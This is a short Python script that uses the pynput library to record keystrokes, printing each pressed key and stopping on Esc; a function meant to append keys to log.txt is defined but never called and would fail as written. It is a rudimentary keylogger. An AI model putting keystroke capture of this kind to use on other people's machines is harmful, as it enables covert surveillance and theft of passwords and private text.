import pynput

from pynput.keyboard import Key, Listener


count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    


def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            f.write(key)



with Listener(on_press =on_press, on_release=on_release) as listener:
    listener.join()